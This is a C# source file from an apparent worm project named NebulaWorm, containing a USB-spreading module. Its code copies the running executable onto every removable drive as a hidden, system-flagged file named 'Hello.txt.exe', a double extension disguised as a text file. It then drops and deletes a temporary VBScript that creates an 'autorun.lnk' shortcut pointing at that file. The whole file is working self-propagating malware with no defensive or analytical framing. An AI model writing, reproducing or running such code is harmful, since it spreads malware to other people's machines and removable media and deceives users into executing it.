using System;
using System.IO;
using System.Diagnostics;

namespace NebulaWorm
{
    internal static class UsbSpread
    {
        public static void Spread()
        {
            string source = Process.GetCurrentProcess().MainModule.FileName;

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                try
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Removable)
                    {
                        string rootPath = drive.RootDirectory.FullName;
                        string destExe = Path.Combine(rootPath, "Hello.txt.exe");

                        if (!File.Exists(destExe))
                        {
                            File.Copy(source, destExe);
                            File.SetAttributes(destExe, FileAttributes.Hidden | FileAttributes.System);
                        }

                        string lnkPath = Path.Combine(rootPath, "autorun.lnk");
                        if (!File.Exists(lnkPath))
                        {
                            CreateShortcut(lnkPath, destExe, rootPath);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"USB Spread Error: {ex.Message}");
                }
            }
        }

        private static void CreateShortcut(string lnkPath, string targetPath, string workingDir)
        {
            try
            {
                string vbs = $@"
Set oWS = WScript.CreateObject(""WScript.Shell"")
Set oLink = oWS.CreateShortcut(""{lnkPath}"")
oLink.TargetPath = ""{targetPath}""
oLink.WorkingDirectory = ""{workingDir}""
oLink.WindowStyle = 1
oLink.Description = ""Windows Shortcut""
oLink.Save
";
                string tempVbs = Path.Combine(Path.GetTempPath(), "temp" + Guid.NewGuid().ToString("N") + ".vbs");
                File.WriteAllText(tempVbs, vbs);

                Process.Start("wscript", $"\"{tempVbs}\"");
                System.Threading.Thread.Sleep(300);
                File.Delete(tempVbs);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Shortcut Error: {ex.Message}");
            }
        }
    }
}
